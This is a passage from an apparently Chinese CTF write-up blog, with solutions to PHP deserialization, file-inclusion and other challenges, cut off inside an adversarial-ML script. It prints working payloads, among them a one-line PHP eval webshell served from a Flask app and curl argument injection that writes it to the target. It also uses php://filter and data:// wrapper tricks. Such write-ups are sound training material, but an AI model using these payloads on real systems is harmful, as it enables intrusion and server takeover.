class="token class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token operator">===</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">)</span>            @<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"╭(●｀∀´●)╯"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"╰(●’◡’●)╮"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>evil类中有一个hint.php</p><p>但是下面可以自由控制的变量只有User类中的两个变量，并不能直接输入反序列化后的字符串。</p><p>进行反序列化操作前，会对序列化字符串进行两次str_replace，将字符串中的<code>\0\0\0</code>和<code>chr(0)</code>相互替换。这一操作原本的用意是为了防止数据库无法处理NULL字节，但是加入我们构造用户名时输入转义字符<code>\\0\\0\\0</code>，就不再是空字节，而是<code>&#39;\&#39;+&#39;0&#39;</code>，这样依旧会被str_replace，但是字符串长度却由<code>\0\0\0(6 bytes)</code>变成了<code>chr(0)*chr(0)(3 bytes)</code></p><p>由于反序列化前使用了str_replace来处理字符串，如果用户输入了转义后的字符串<code>\\0\\0\\0</code>，就会导致长度不正确，也就产生了溢出。</p><p>这样就可以通过构造Username和password来实例化evil类。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"peri0d*********"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">48</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1234"</span><span class="token punctuation">;</span><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"evil"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hint"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64：</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密后：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php $hint &#x3D; &quot;index.cgi&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问得到：</p><pre class="line-numbers language-none"><code class="language-none">&#123; &quot;args&quot;: &#123; &quot;name&quot;: &quot;Bob&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*&#x2F;*&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;curl&#x2F;7.64.0&quot;, &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-60325113-7f66a0210d7cd3ad197668c5&quot; &#125;, &quot;origin&quot;: &quot;114.67.246.176&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;Bob&quot; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用curl的参数来getshell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>routing <span class="token keyword">import</span> BaseConverter<span class="token keyword">class</span> <span class="token class-name">RegexConverter</span><span class="token punctuation">(</span>BaseConverter<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">map</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">map</span> <span class="token operator">=</span> <span class="token builtin">map</span>        self<span class="token punctuation">.</span>regex <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>converters<span class="token punctuation">[</span><span class="token string">'regex'</span><span class="token punctuation">]</span> <span class="token operator">=</span> RegexConverter<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;regex(".*"):url>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"&lt;?php @eval($_POST['pass']);?>"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让其返回一句话木马，放在公网ip上，通过-o参数，即可将其写入到服务器上。</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;a -o shell.php http:&#x2F;&#x2F;ip:5000&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后拿蚁剑连接</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里想到可以利用data伪协议传参绕过</p><p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p><p>接下来：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面有个正则过滤掉了flag，但是下面有个提示useless.php的提示</p><p>先用php://filter协议读取</p><p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//useless.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据提示进行序列化，这题基本上就结束了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行代码得到序列化字符串:<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>payload:</p><p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021春秋杯</title>
      <link href="2021/web/2021-chun-qiu-bei/"/>
      <url>2021/web/2021-chun-qiu-bei/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>画一个FUN的图片给它扫</p><p>flag{ju5t_f0r_FUN}</p><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>原文：</p><pre class="line-numbers language-none"><code class="language-none">^#@$@#()&#x2F;&gt;@?&#x3D;&#x3D;%1(!)&gt;(*+3&lt;#86@-7$^.4&amp;)8%#5&amp;6!&#x3D;%1#$-$+5&amp;?#!.03!%&#x3D;@&#x3D;1010?(*~#??.+)%&amp;.7^8&#x3D;1%*^&#x3D;$5$7@@8&gt;&amp;*99@0185(+7)&lt;%3#@^4&amp;@@&lt;.)$3*#%%&lt;&lt;*++.@.?&#x3D;~**+!&#x3D;&#x3D;65^@&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在网上兜兜转转找到解密方法<a href="https://www.bilibili.com/video/BV1nX4y1u7Eo/">B站的一个视频讲的非常详细</a></p><p>规则是从第一个开始，依次往下一行往右两格</p><p>result：</p><pre class="line-numbers language-none"><code class="language-none">^&gt;%..@3*&amp;#(#0+@#+.@*53)8@+@$+&amp;!%&gt;^&amp;.@36%&amp;&amp;4@?#&lt;!&#x3D;.*9@&#x3D;(#&#x3D;@79@&lt;~)8%&#x3D;^&#x3D;0.*&#x2F;611811)*&gt;@#00%8$+@-$1?*53!?7-+(^(*&#x3D;&#x3D;$$5*&#x3D;+#&#x3D;&#x3D;^4&amp;~$7%6%.&amp;?#5)%51!)#?$&lt;&lt;^()8!?7%&lt;@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后放到AZdecrypt里去解码就可以了</p><p>解出来是这个</p><pre class="line-numbers language-none"><code class="language-none">IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{WUUHUUTAKEOFF}</p><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>要我们把这一千多张小图片拼成一张图片。。。</p><p>找到有字符的图片，在那个动物的身上，直接拿ps拼</p><p>拼出来大概这么个效果，很糊</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194417110.png" alt="image-20210208194417110"></p><p>flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49}</p><h2 id="old-driver"><a href="#old-driver" class="headerlink" title="old_driver"></a>old_driver</h2><p>下载下来后是一堆图片，一个python脚本，还有一个模型</p><p>这种AI题目第一次遇见，刚看到的时候没有任何头绪😪</p><p>跟着别人的wp学习了一遍</p><p>attack.py源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> glob <span class="token keyword">import</span> glob<span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token punctuation">,</span> optim<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">import</span> torchattacks <span class="token comment"># https://github.com/Harry24k/adversarial-attacks-pytorch</span><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256<span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Model<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>pool <span class="token operator">=</span> nn<span class="token punctuation">.</span>MaxPool2d<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dropout <span class="token operator">=</span> nn<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0.5</span><span class="token 